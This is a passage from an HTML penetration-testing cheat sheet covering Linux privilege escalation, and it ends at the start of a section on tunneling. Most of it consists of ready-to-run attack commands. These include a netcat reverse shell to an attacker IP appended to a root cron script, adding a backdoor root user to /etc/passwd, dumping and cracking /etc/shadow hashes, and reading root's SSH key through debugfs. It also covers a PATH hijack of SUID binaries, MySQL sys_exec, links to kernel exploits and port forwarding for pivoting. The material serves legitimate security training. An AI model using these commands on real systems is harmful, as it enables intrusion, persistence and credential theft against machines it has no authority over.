                    <td>Lists network interfaces, IP addresses, routing tables, and open ports.</td>
                  </tr>
                  <tr>
                    <td><strong>Firewall rules</strong></td>
                    <td><code>cat /etc/iptables/rules.v4</code></td>
                    <td>Displays the current iptables firewall rules (if applicable).</td>
                  </tr>
                  <tr>
                    <td><strong>Scheduled cron tasks</strong></td>
                    <td><code>ls -lah /etc/cron*</code>, <code>crontab -l</code>, <code>sudo crontab -l</code></td>
                    <td>Lists scheduled cron jobs for the system and users.</td>
                  </tr>
                  <tr>
                    <td><strong>Installed applications</strong></td>
                    <td><code>dpkg -l</code></td>
                    <td>Shows installed packages and versions on Debian-based systems.</td>
                  </tr>
                  <tr>
                    <td><strong>Sensitive writable files</strong> (excluding <code>/dev/null</code>)</td>
                    <td><code>find / -writable -type d 2&gt;/dev/null</code></td>
                    <td>Searches for directories that are writable by the current user.</td>
                  </tr>
                  <tr>
                    <td><strong>In memory passwords</strong></td>
                    <td><code>strings /dev/mem -n10 | grep -i PASS</code></td>
                    <td>Displays possible password that are in memory.</td>
                  </tr>
                  <tr>
                    <td><strong>Find sensitive files</strong></td>
                    <td><code>locate password | more</code></td>
                    <td>Find possible files with sensitive information.</td>
                  </tr>
                  <tr>
                    <td><strong>Mounted drives</strong></td>
                    <td><code>cat /etc/fstab</code>, <code>mount</code>, <code>lsblk</code></td>
                    <td>Lists currently mounted drives and their mount points.</td>
                  </tr>
                  <tr>
                    <td><strong>Device drivers and kernel modules</strong></td>
                    <td><code>lsmod</code>, <code>/sbin/modinfo &lt;driver_name&gt;</code></td>
                    <td>Lists loaded kernel modules and displays info about a specific module.</td>
                  </tr>
                  <tr>
                    <td><strong>SUID binaries</strong></td>
                    <td><code>find / -perm -u=s -type f 2&gt;/dev/null</code>, <code>sudo -l</code>,
                      <code>sudo -i</code>
                    </td>
                    <td>Finds files with the SUID bit set, which could be used to escalate privileges.</td>
                  </tr>
                  <tr>
                    <td><strong>Automated enumeration</strong></td>
                    <td>Transfer and run <code>unix-privesc-check</code></td>
                    <td>Automates privilege escalation checks on the system.</td>
                  </tr>
                </tbody>
              </table>
              <h3 id="82-inspecting-service-footprints">8.2 Inspecting Service Footprints</h3>
              <p><strong>Monitor active processes</strong> for passwords and other credentials</p>
              <pre><code class="language-bash">watch -n 1 &quot;ps -aux | grep pass&quot;
</code></pre>
              <p><strong>Sniff passwords</strong> on the loopback interface using <code>tcpdump</code></p>
              <pre><code class="language-bash">sudo tcpdump -i lo -A | grep &quot;pass&quot;
</code></pre>
              <p><strong>Inspect Tcpdump</strong></p>
              <pre><code class="language-bash">tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 10.11.1.111 and dst not 10.11.1.111
tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111
</code></pre>
              <h3 id="83-cron-jobs">8.3 <em>Cron</em> Jobs</h3>
              <p>Look for CronJobs that are running with higher privileges but are writable by the current user. If
                found, you can modify these scripts to escalate privileges.</p>
              <ol>
                <li><strong>Find CRON Jobs</strong></li>
              </ol>
              <pre><code class="language-bash">grep &quot;CRON&quot; /var/log/syslog
or
cat /var/log/cron.log
</code></pre>
              <ol start="2">
                <li><strong>Check permissions</strong> for the script</li>
              </ol>
              <pre><code class="language-bash">ls -lah /path/to/script.sh
</code></pre>
              <ol start="3">
                <li><strong>Modify the script to add a reverse shell</strong> (in case we have permissions to edit),
                  depending on the case another possible payloads could be added, for example adding a new root user.
                </li>
              </ol>
              <pre><code class="language-bash">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [attacker_ip] [listener_port] &gt;/tmp/f&quot; &gt;&gt; /path/to/script.sh
</code></pre>
              <ol start="4">
                <li><strong>(Optional)</strong> Other Commands to Inspect Cron Jobs.</li>
              </ol>
              <pre><code class="language-bash">crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
</code></pre>
              <h3 id="84-password-files">8.4 Password Files</h3>
              <h4 id="841-etcpasswd">8.4.1 <em>/etc/passwd</em></h4>
              <p>The misconfiguration is if we have permissions to edit this file, which we should not have, in which
                case we will modify it to <strong>add a new root user</strong>.</p>
              <ol>
                <li>Create the hash</li>
              </ol>
              <pre><code class="language-bash">openssl passwd Password123
</code></pre>
              <ol start="2">
                <li>Add the hash to the <code>/etc/passwd</code> file</li>
              </ol>
              <pre><code class="language-bash"># This is just an example using the output of the previous command.
echo&quot;newroot:$6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0:0:0:root:/root:/bin/bash&quot;&gt;&gt; /etc/passwd
</code></pre>
              <ol start="3">
                <li>Switch to the new user</li>
              </ol>
              <pre><code class="language-bash">su newroot

# Verify root access
id
</code></pre>
              <h4 id="842-etcshadow">8.4.2 <em>/etc/shadow</em></h4>
              <p>The misconfiguration is that we should not be able to look the contents of this file, if we can do it
                then we could see the <strong>hashes for the users and crack them</strong>.</p>
              <ol>
                <li>Get the hash out.</li>
              </ol>
              <pre><code class="language-bash">cat /etc/shadow | grep [root_user] &gt; [root_user]_hash.txt
</code></pre>
              <ol start="2">
                <li>Crack the hash</li>
              </ol>
              <pre><code class="language-bash"># John The Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt [root_user]_hash.txt

# Hashcat, we need to isolate the hash part, for example from above hash would be: $6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0
hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt
</code></pre>
              <ol start="3">
                <li>Show the password</li>
              </ol>
              <pre><code class="language-bash"># John The Ripper
john --show [root_user]_hash.txt

# Hashcat
hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt --show
</code></pre>
              <h3 id="85-setuid-binaries-and-capabilities">8.5 Setuid Binaries and Capabilities</h3>
              <h4 id="851-setuid-binaries">8.5.1 Setuid Binaries</h4>
              <p><strong>Setuid</strong> (Set User ID) binaries are executables that run with the privileges of the file
                owner, which is often root. Exploiting these binaries can grant elevated access if the binary is
                misconfigured or vulnerable.</p>
              <ol>
                <li><strong>Find Setuid Binaries:</strong></li>
              </ol>
              <pre><code class="language-bash">find / -perm -4000 -type f 2&gt;/dev/null
</code></pre>
              <ol start="2">
                <li><strong>Inspect Permissions and Owners:</strong></li>
              </ol>
              <pre><code class="language-bash">ls -l $(find / -perm -4000 -type f 2&gt;/dev/null)
</code></pre>
              <ol start="3">
                <li><strong>Check for Vulnerabilities:</strong></li>
              </ol>
              <ul>
                <li>Review the setuid binaries for known vulnerabilities.</li>
                <li>Check if they can be exploited by running as a different user.</li>
                <li>Utilize tools like <a href="https://gtfobins.github.io/">GTFOBins</a> to find specific exploitation
                  techniques for binaries.</li>
              </ul>
              <h4 id="852-exploiting-setuid-binaries">8.5.2 Exploiting Setuid Binaries</h4>
              <ol>
                <li><strong>Finding the Process ID (PID) of a Running Binary:</strong></li>
              </ol>
              <pre><code class="language-bash">ps u -C [binary_name]
</code></pre>
              <ol start="2">
                <li><strong>Inspect Credentials of a Running Process:</strong></li>
              </ol>
              <pre><code class="language-bash">cat /proc/[PID]/status | grep Uid
</code></pre>
              <ol start="3">
                <li><strong>Getting a Reverse Shell Using <code>find</code>:</strong></li>
              </ol>
              <pre><code class="language-bash">find [directory] -exec [path_to_shell] \;
</code></pre>
              <ol start="4">
                <li><strong>Exploit:</strong></li>
              </ol>
              <pre><code class="language-bash"># Replace [vulnerable_binary] with the name of the binary you are targeting.
find / -name [vulnerable_binary] -exec /bin/bash -p \;
</code></pre>
              <h4 id="853-capabilities">8.5.3 Capabilities</h4>
              <p>Linux capabilities allow for finer-grained control over the privileges a process has, which can
                sometimes be exploited to escalate privileges.</p>
              <ol>
                <li><strong>Enumerate Capabilities:</strong></li>
              </ol>
              <pre><code class="language-bash">/usr/sbin/getcap -r / 2&gt;/dev/null
</code></pre>
              <ol start="2">
                <li><strong>Inspect a Specific Binary for Capabilities:</strong></li>
              </ol>
              <pre><code class="language-bash">getcap [binary_path]

# For example
getcap /usr/bin/nmap
</code></pre>
              <ol start="3">
                <li><strong>Adjust Capabilities (Requires root):</strong></li>
              </ol>
              <pre><code class="language-bash">setcap [capabilities] [binary_path]

# Example to add CAP_DAC_OVERRIDE to a binary
setcap cap_dac_override=eip /path/to/binary
</code></pre>
              <ol start="4">
                <li><strong>Remove Capabilities (Requires root):</strong></li>
              </ol>
              <pre><code class="language-bash">setcap -r [binary_path]

# For example
setcap -r /usr/bin/nmap
</code></pre>
              <p><strong>Useful Resources:</strong></p>
              <ul>
                <li><a href="https://gtfobins.github.io/">GTFOBins</a> - A curated list of Unix binaries that can be
                  exploited for privilege escalation.</li>
                <li><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">Linux Capabilities
                    Documentation</a> - Detailed documentation on Linux capabilities.</li>
              </ul>
              <h4 id="854-table-of-capabilities">8.5.4 Table of Capabilities</h4>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th><strong>Capability Name</strong></th>
                    <th><strong>Description</strong></th>
                    <th><strong>Potential Impact</strong></th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>CAP_AUDIT_CONTROL</strong></td>
                    <td>Allows enabling or disabling kernel auditing.</td>
                    <td>Can be used to disable auditing mechanisms and evade detection.</td>
                  </tr>
                  <tr>
                    <td><strong>CAP_AUDIT_WRITE</strong></td>
                    <td>Allows writing records to the kernel auditing log.</td>
                    <td>Can be used to manipulate or inject log entries, potentially covering up malicious activities.
                    </td>
                  </tr>
                  <tr>
                    <td><strong>CAP_BLOCK_SUSPEND</strong></td>
                    <td>Prevents the system from suspending or hibernating.</td>
                    <td>Can be used to keep a system awake, which might be useful for long-running attacks or preventing
                      automatic lockdowns.</td>
                  </tr>
                  <tr>
                    <td><strong>CAP_CHOWN</strong></td>
                    <td>Allows arbitrary changes to file UIDs and GIDs.</td>
                    <td>Enables changing file ownership, potentially allowing privilege escalation or tampering with
                      critical files.</td>
                  </tr>
                  <tr>
                    <td><strong>CAP_DAC_OVERRIDE</strong></td>
                    <td>Bypasses file read, write, and execute permission checks.</td>
                    <td>Provides unrestricted access to files, regardless of permissions, which can be used to access or
                      modify sensitive files.</td>
                  </tr>
                  <tr>
                    <td><strong>CAP_DAC_READ_SEARCH</strong></td>
                    <td>Bypasses file and directory read and execute permission checks.</td>
                    <td>Allows reading and searching files and directories that would normally be restricted.</td>
                  </tr>
                  <tr>
                    <td><strong>CAP_FOWNER</strong></td>
                    <td>Bypasses permission checks on operations that require the filesystem UID of the process to match
                      the UID of the file.</td>
                    <td>Allows performing actions on files that normally require matching ownership, potentially
                      enabling unauthorized file modifications.</td>
                  </tr>
                  <tr>
                    <td><strong>CAP_IPC_LOCK</strong></td>
                    <td>Allows locking memory into RAM.</td>
                    <td>Can be used to prevent critical memory from being swapped out, which may be useful for
                      maintaining persistence or performance in an attack.</td>
                  </tr>
                  <tr>
                    <td><strong>CAP_KILL</strong></td>
                    <td>Allows sending signals to processes owned by other users.</td>
                    <td>Can be used to terminate or signal processes belonging to other users, potentially disrupting
                      services or attacking other users&#39; processes.</td>
                  </tr>
                  <tr>
                    <td><strong>CAP_MAC_ADMIN</strong></td>
                    <td>Allows configuring or changing Mandatory Access Control (MAC) settings.</td>
                    <td>Provides the ability to alter MAC policies, which could weaken security policies or bypass
                      certain security controls.</td>
                  </tr>
                  <tr>
                    <td><strong>CAP_NET_BIND_SERVICE</strong></td>
                    <td>Allows binding sockets to privileged ports (ports below 1024).</td>
                    <td>Enables services to listen on standard ports (e.g., 80, 443) without requiring root privileges,
                      which might be used to disguise malicious services as legitimate ones.</td>
                  </tr>
                  <tr>
                    <td><strong>CAP_NET_RAW</strong></td>
                    <td>Allows using raw and packet sockets.</td>
                    <td>Can be used for network sniffing, crafting custom packets, or bypassing network filters and
                      protections.</td>
                  </tr>
                  <tr>
                    <td><strong>CAP_SETGID</strong></td>
                    <td>Allows changing the GID of a process.</td>
                    <td>Enables changing the group ID of processes, which can affect group-based permissions and access
                      controls.</td>
                  </tr>
                  <tr>
                    <td><strong>CAP_SETPCAP</strong></td>
                    <td>Allows transferring and removing capabilities from processes.</td>
                    <td>Enables modifying the capabilities of running processes, which can be used to escalate
                      privileges or evade detection.</td>
                  </tr>
                  <tr>
                    <td><strong>CAP_SETUID</strong></td>
                    <td>Allows changing the UID of a process.</td>
                    <td>Provides the ability to change the user ID of processes, potentially leading to privilege
                      escalation or impersonation.</td>
                  </tr>
                </tbody>
              </table>
              <h3 id="86-abusing-sudo">8.6 Abusing <em>SUDO</em></h3>
              <p><strong>Check what we can run as sudo without password</strong></p>
              <pre><code class="language-bash">sudo -l
</code></pre>
              <p><strong>All Possible SUID to Exploit</strong> are available in this page <em><a
                    href="https://gtfobins.github.io/">GTFOBins</a></em>.</p>
              <p><strong>Inspect syslog file for process relevant events</strong></p>
              <pre><code class="language-bash">grep [process_name] /var/log/syslog
</code></pre>
              <h3 id="87-kernel-exploitations">8.7 Kernel Exploitations</h3>
              <p>This is just a table reference, there are a lot of other possible kernel exploits.</p>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th><strong>CVE Identifier</strong></th>
                    <th><strong>Description</strong></th>
                    <th><strong>Target Kernel Versions</strong></th>
                    <th><strong>Exploit URL</strong></th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>CVE-2010-3904</strong></td>
                    <td>RDS</td>
                    <td>Linux Kernel &lt;= 2.6.36-rc8</td>
                    <td><a href="https://www.exploit-db.com/exploits/15285/" target="_blank">Exploit</a></td>
                  </tr>
                  <tr>
                    <td><strong>CVE-2010-4258</strong></td>
                    <td>Full Nelson</td>
                    <td>Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)</td>
                    <td><a href="https://www.exploit-db.com/exploits/15704/" target="_blank">Exploit</a></td>
                  </tr>
                  <tr>
                    <td><strong>CVE-2012-0056</strong></td>
                    <td>Mempodipper</td>
                    <td>Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</td>
                    <td><a href="https://www.exploit-db.com/exploits/17568" target="_blank">Exploit</a></td>
                  </tr>
                  <tr>
                    <td><strong>CVE-2016-5195</strong></td>
                    <td>DirtyCow</td>
                    <td>Linux Kernel &lt;= 3.19.0-73.8</td>
                    <td><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" target="_blank">Exploit 1</a>
                      <br> <a href="https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c"
                        target="_blank">Exploit 2</a>
                    </td>
                  </tr>
                  <tr>
                    <td><strong>CVE-2016-5696</strong></td>
                    <td>TCP Remote Code Execution</td>
                    <td>Linux Kernel 3.6 - 4.7</td>
                    <td><a href="https://github.com/gtworek/DirtyCow/blob/master/tcp-4.7.c" target="_blank">Exploit</a>
                    </td>
                  </tr>
                  <tr>
                    <td><strong>CVE-2017-8890</strong></td>
                    <td>Race Condition in Linux Kernel</td>
                    <td>Linux Kernel &lt; 4.11.6</td>
                    <td><a href="https://www.exploit-db.com/exploits/42127" target="_blank">Exploit</a></td>
                  </tr>
                  <tr>
                    <td><strong>CVE-2018-8897</strong></td>
                    <td>Insecure Use of a Memory Barrier</td>
                    <td>Linux Kernel 3.14 - 4.15</td>
                    <td><a href="https://github.com/stealthc/Kernel-Exploits/tree/master/CVE-2018-8897"
                        target="_blank">Exploit</a></td>
                  </tr>
                  <tr>
                    <td><strong>CVE-2019-7304</strong></td>
                    <td>Race Condition in OverlayFS</td>
                    <td>Linux Kernel 4.10 - 4.15</td>
                    <td><a href="https://github.com/shellphish/exploits/tree/master/CVE-2019-7304"
                        target="_blank">Exploit</a></td>
                  </tr>
                  <tr>
                    <td><strong>CVE-2021-4034</strong></td>
                    <td>PwnKit</td>
                    <td>Linux Kernel 4.4 - 5.8</td>
                    <td><a href="https://github.com/ly4k/PwnKit" target="_blank">Exploit</a></td>
                  </tr>
                  <tr>
                    <td><strong>CVE-2020-14386</strong></td>
                    <td>Privilege Escalation via OverlayFS</td>
                    <td>Linux Kernel 4.8 - 5.7</td>
                    <td><a href="https://github.com/0x00-0x00/CVE-2020-14386" target="_blank">Exploit</a></td>
                  </tr>
                  <tr>
                    <td><strong>CVE-2021-3156</strong></td>
                    <td>Sudo Privilege Escalation</td>
                    <td>Sudo versions &lt; 1.9.5p2</td>
                    <td><a href="https://www.exploit-db.com/exploits/49610" target="_blank">Exploit</a></td>
                  </tr>
                  <tr>
                    <td><strong>CVE-2021-33034</strong></td>
                    <td>Privilege Escalation via the Kernel</td>
                    <td>Linux Kernel 5.4 - 5.10.4</td>
                    <td><a href="https://github.com/0x00-0x00/CVE-2021-33034" target="_blank">Exploit</a></td>
                  </tr>
                  <tr>
                    <td><strong>CVE-2022-0847</strong></td>
                    <td>DirtyPipe</td>
                    <td>Linux Kernel 5.8 &lt; 5.16.11</td>
                    <td><a href="https://www.exploit-db.com/exploits/50808" target="_blank">Exploit</a></td>
                  </tr>
                </tbody>
              </table>
              <h3 id="88-wildcard-exploitation">8.8 Wildcard Exploitation</h3>
              <p>Wildcard exploitation involves leveraging wildcards (<code>*</code>, <code>?</code>, <code>[]</code>)
                in file and command operations to gain unauthorized access or perform unintended actions. This section
                covers common methods and examples for exploiting wildcards in Linux environments.</p>
              <h4 id="881-wildcard-basics">8.8.1 Wildcard Basics</h4>
              <ul>
                <li><strong>Asterisk (*)</strong>: Matches any number of characters, including zero.</li>
                <li><strong>Question Mark (?)</strong>: Matches exactly one character.</li>
                <li><strong>Square Brackets ([]):</strong> Matches any one of the enclosed characters.</li>
              </ul>
              <h4 id="882-exploitation-guide">8.8.2 Exploitation Guide</h4>
              <p>Since this is a complex exploitation technique, if we find a script, cron jobs, tasks or else for which
                we can perform wildcard exploitation, we could follow these two guides on how to do it:</p>
              <ul>
                <li><strong><a
                      href="https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c">Tar
                      Wildcard Injection</a></strong></li>
                <li><strong><a
                      href="https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa">Wildcards
                      with tar</a></strong></li>
              </ul>
              <h4 id="883-exploiting-wildcards-in-command-execution">8.8.3 Exploiting Wildcards in Command Execution
              </h4>
              <ol>
                <li><strong>Wildcard Expansion in Commands:</strong> Wildcards can be used to execute commands on
                  multiple files or directories. This can be exploited if an application or script does not handle
                  wildcards properly.</li>
              </ol>
              <pre><code class="language-bash">ls /var/log/*
</code></pre>
              <ol start="2">
                <li><strong>Misconfigured Scripts:</strong> If a script uses wildcards in a vulnerable way, it can lead
                  to command injection or unintended behavior.</li>
              </ol>
              <pre><code class="language-bash"># Example vulnerable script
tar -cvf archive.tar.gz /var/log/*
</code></pre>
              <h4 id="884-exploiting-wildcards-in-file-operations">8.8.4 Exploiting Wildcards in File Operations</h4>
              <ol>
                <li><strong>File Creation and Modification:</strong> Wildcards can be used to create or modify multiple
                  files if the application or script does not properly sanitize input.</li>
              </ol>
              <pre><code class="language-bash">touch /tmp/file_*
</code></pre>
              <ol start="2">
                <li><strong>Race Conditions:</strong> Wildcards in file operations can be exploited to create race
                  conditions.</li>
              </ol>
              <pre><code class="language-bash"># If an attacker can modify files in /etc/, they could exploit the wildcard to overwrite or manipulate critical configuration files.
cp /etc/* /tmp/backup/
</code></pre>
              <h3 id="89-disk-group-permissions">8.9 Disk Group Permissions</h3>
              <p>If checking permissions we found that we belong to the disk group, we can use this <a
                  href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group">guide</a>
                for accessing the filesystem as root; this should be used to:</p>
              <ol>
                <li>See files and their contents.</li>
                <li>Get a reverse shell.</li>
                <li>Modify permissions to be root.</li>
                <li>Add a new root user account that we could use.</li>
              </ol>
              <p><strong>Exploit example</strong></p>
              <pre><code class="language-shell">df -h #Find where &quot;/&quot; is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
</code></pre>
              <h3 id="810-mysql-privilege-escalation">8.10 MySQL Privilege Escalation</h3>
              <p>If MySQL is running as root and you have credentials to log in, you can execute system commands
                directly from the database.</p>
              <pre><code class="language-sql">select sys_exec(&#39;whoami&#39;);
select sys_eval(&#39;whoami&#39;);
</code></pre>
              <h3 id="811-user-installed-software">8.11 User-Installed Software</h3>
              <p>Check for third-party software installed by the user. These programs might have vulnerabilities, so
                it&#39;s important to investigate further.</p>
              <p><strong>Common directories for user-installed software:</strong></p>
              <pre><code class="language-bash">/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/
</code></pre>
              <p><strong>Check installed software by distribution:</strong></p>
              <pre><code class="language-bash"># Debian/Ubuntu
dpkg -l

# CentOS/openSUSE/Fedora/RHEL
rpm -qa

# OpenBSD/FreeBSD
pkg_info
</code></pre>
              <h3 id="812-weak-reused-and-plaintext-passwords">8.12 Weak, Reused, and Plaintext Passwords</h3>
              <ul>
                <li>Check web server configuration files (<code>config.php</code> or similar) for database connection
                  details, which might reveal admin passwords.</li>
                <li>Check for reused or weak passwords in databases.</li>
              </ul>
              <p><strong>Common weak/reused passwords</strong></p>
              <pre><code class="language-bash">root:root
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
</code></pre>
              <p><strong>Check for plaintext passwords</strong></p>
              <pre><code class="language-bash"># Anything interesting in the mail folder?
/var/mail
/var/spool/mail
</code></pre>
              <p><strong>Use LinEnum to search for passwords</strong></p>
              <pre><code class="language-bash">./LinEnum.sh -t -k password
</code></pre>
              <h3 id="813-internal-services">8.13 Internal Services</h3>
              <h4 id="8131-display-active-network-connections">8.13.1 Display Active Network Connections</h4>
              <pre><code class="language-bash"># List network services
netstat -anlp
netstat -ano
</code></pre>
              <h4 id="8132-types-of-addresses">8.13.2 Types of Addresses</h4>
              <ul>
                <li><strong>Local address 0.0.0.0</strong>: Service is listening on all interfaces (external and
                  internal). Anyone can connect to it.</li>
                <li><strong>Local address 127.0.0.1</strong>: Service is only listening for connections from the local
                  machine. <strong>This is important to investigate</strong>.</li>
                <li><strong>Local address 192.168.x.x</strong>: Service is only listening for connections from the local
                  network (internal users). <strong>This is important to investigate</strong>.</li>
              </ul>
              <h3 id="814-world-writable-scripts-invoked-as-root">8.14 World-Writable Scripts Invoked as Root</h3>
              <p>If you find scripts that are owned by root but writable by others, you can inject malicious code. This
                may escalate your privileges when the script is run by root, either manually or automatically (via
                cronjobs, for example).</p>
              <p><strong>Commands to find world-writable files and directories:</strong></p>
              <pre><code class="language-bash"># World-writable directories
find / -writable -type d 2&gt;/dev/null
find / -perm -222 -type d 2&gt;/dev/null
find / -perm -o w -type d 2&gt;/dev/null

# World-executable directories
find / -perm -o x -type d 2&gt;/dev/null

# World-writable and executable directories
find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null
</code></pre>
              <h3 id="815-unmounted-filesystems">8.15 Unmounted FileSystems</h3>
              <p>Sometimes unmounted filesystems can contain sensitive data or configuration files. If found, mount them
                and re-check for privilege escalation opportunities.</p>
              <p><strong>Commands to check for unmounted filesystems:</strong></p>
              <pre><code class="language-bash">mount -l
cat /etc/fstab
</code></pre>
              <h3 id="816-suid-and-guid-files">8.16 SUID and GUID Files</h3>
              <h4 id="8161-understanding-suid-and-guid">8.16.1 Understanding SUID and GUID</h4>
              <ul>
                <li>
                  <p><strong>SUID (Set User ID):</strong> when a file with the SUID bit set is executed, it runs with
                    the permissions of the file&#39;s owner (often root) rather than the user who executed it. This can
                    lead to privilege escalation if the file allows unintended actions. For example, if an attacker can
                    execute a root-owned binary with SUID enabled, they could gain root privileges.</p>
                </li>
                <li>
                  <p><strong>GUID (Set Group ID):</strong> similarly, a file with the GUID bit set runs with the
                    permissions of the file&#39;s group. While less dangerous than SUID, this could still result in
                    privilege escalation if the group has elevated privileges.</p>
                </li>
              </ul>
              <h4 id="8162-finding-suid-and-guid-files">8.16.2 Finding SUID and GUID Files</h4>
              <pre><code class="language-bash"># Find SUID files
find / -perm -u=s -type f 2&gt;/dev/null

# Find GUID files
find / -perm -g=s -type f 2&gt;/dev/null
</code></pre>
              <h4 id="8163-determining-exploitability">8.16.3 Determining Exploitability</h4>
              <p>After finding them we need to find if they can be used for privilege escalation, there are a
                <strong>few options available</strong>:
              </p>
              <ul>
                <li>
                  <p><strong><a href="https://gtfobins.github.io/">GTFOBins</a></strong>: here we can find a complete
                    list of all exploitable SUIDs and GUIDs as well as their command to escalate privileges.</p>
                </li>
                <li>
                  <p><strong>Custom SUID/SGID Files</strong>: If custom binaries or scripts are found with SUID/SGID
                    permissions (especially those created by users), they may be misconfigured and vulnerable.</p>
                </li>
              </ul>
              <pre><code class="language-bash"># Option 1: Use strings to examine the contents.
strings /path/to/suid-binary

# Option 2: Check for system calls or file execution.
ltrace /path/to/suid-binary

# Option 3: Exploit PATH Vulnerability: if the SUID binary calls another program (e.g., /bin/cp or /bin/sh), you might be able to manipulate the $PATH variable to run your own malicious binary instead.
# Create a malicious version of the expected program
echo &#39;/bin/sh&#39; &gt; /tmp/cp
chmod +x /tmp/cp

# Modify PATH to prioritize your malicious version
export PATH=/tmp:$PATH

# Run the vulnerable SUID program
/path/to/suid-program
</code></pre>
              <ul>
                <li><strong>Examine Writable SUID Binaries</strong>: If any SUID binaries are writable, you can modify
                  them directly to add malicious code; this is extremely rare but worth checking.</li>
              </ul>
              <pre><code class="language-bash"># Find writable SUID files
find / -perm -u=s -writable -type f 2&gt;/dev/null

# If a writable SUID binary is found, you can inject your own code and run it with elevated privileges.
</code></pre>
              <ul>
                <li><strong>Finding Potentially Dangerous Custom Scripts</strong>: often, custom scripts used in
                  cronjobs or other automated tasks may have the SUID/SGID bit set or be writable. If they are writable
                  by your user, you can edit these scripts to escalate privileges.</li>
              </ul>
              <pre><code class="language-bash"># Find scripts in cronjobs or system directories that may have SUID or GUID set
find /etc/cron* /var/spool/cron/ -perm -u=s -type f 2&gt;/dev/null
</code></pre>
              <h3 id="817-scripts">8.17 Scripts</h3>
              <h4 id="8171-linpeas">8.17.1 LinPEAS</h4>
              <p><strong>LinPEAS</strong> (Linux Privilege Escalation Awesome Script) is used for enumerating potential
                privilege escalation vectors.</p>
              <p><strong>Usage</strong></p>
              <pre><code class="language-bash">./linpeas.sh
</code></pre>
              <p><strong>Output to a file while preserving colors</strong></p>
              <pre><code class="language-bash">./linpeas.sh | tee linpeas_output.txt
</code></pre>
              <p><strong>Convert output file to HTML</strong></p>
              <pre><code class="language-bash"># 1. Download file from victim to local Kali, we could use techniques from section 17.

# 2. Convert .txt to .json.
python3 peas2json.py ./linpeas_output.txt peass.json

# 3. Convert .json to .html.
python3 json2html.py peass.json peass.html

# (Optional) We could also convert it to PDF.
python3 json2pdf.py peass.json peass.pdf
</code></pre>
              <h4 id="8172-linenum">8.17.2 LinEnum</h4>
              <p><strong>LinEnum</strong> is a script designed to perform enumeration of information related to
                privilege escalation on Linux systems.</p>
              <p><strong>Usage</strong></p>
              <pre><code class="language-bash">./LinEnum.sh

# Search for passwords
./LinEnum.sh -t -k password
</code></pre>
              <p><strong>Save output to a file</strong></p>
              <pre><code class="language-bash">./LinEnum.sh | tee linenum_output.txt
</code></pre>
              <h4 id="8173-unix-privesc-check">8.17.3 Unix-privesc-check</h4>
              <p><strong>Unix-privesc-check</strong> is a script that checks for common privilege escalation vectors on
                Unix-like systems.</p>
              <p><strong>Usage</strong></p>
              <pre><code class="language-bash">./unix-privesc-check.sh
</code></pre>
              <p><strong>Save output to a file</strong></p>
              <pre><code class="language-bash">./unix-privesc-check.sh | tee unix_privesc_check_output.txt
</code></pre>
              <h4 id="8174-checksec">8.17.4 Checksec</h4>
              <p><strong>Checksec</strong> is a tool that checks various security-related features of the kernel and
                binaries.</p>
              <p><strong>Usage</strong></p>
              <pre><code class="language-bash">checksec --all
</code></pre>
              <h4 id="8175-peepdf">8.17.5 Peepdf</h4>
              <p><strong>Peepdf</strong> is a tool for analyzing and extracting information from PDF files, which can be
                used to find potential exploits.</p>
              <p><strong>Usage</strong></p>
              <pre><code class="language-bash">peepdf.py file.pdf
</code></pre>
              <h4 id="8176-exploit-suggester">8.17.6 Exploit Suggester</h4>
              <p><strong>Usage</strong></p>
              <pre><code class="language-bash">python3 exploit-suggester.py
</code></pre>
              <h2 id="9-port-redirection-and-manual-tunneling">9. <span class="emoji">üîÄ</span> Port Redirection and
                Manual Tunneling</h2>
              <h3 id="91-port-redirection-with-socat">9.1 Port Redirection with Socat</h3>
              <pre><code class="language-bash">socat -ddd TCP-LISTEN:[listening_local_port_on_dmz],fork TCP:[internal_ip]:[internal_port]
</code></pre>
              <h3 id="92-ssh-local-port-forwarding">9.2 SSH Local Port Forwarding</h3>
              <pre><code class="language-bash">ssh -N -L 0.0.0.0:[local_port_on_rev_shell]:[internal_ip_target]:[internal_ip_port] username@internal_host
</code></pre>
              <h3 id="93-ssh-dynamic-port-forwarding">9.3 SSH Dynamic Port Forwarding</h3>
              <ol>
                <li>Setting Up Dynamic Port Forwarding</li>
              </ol>
              <pre><code class="language-bash">ssh -N -D 0.0.0.0:[local_socks_proxy_port] username@internal_host
</code></pre>
              <ol start="2">
                <li>Configure Proxychains</li>
              </ol>
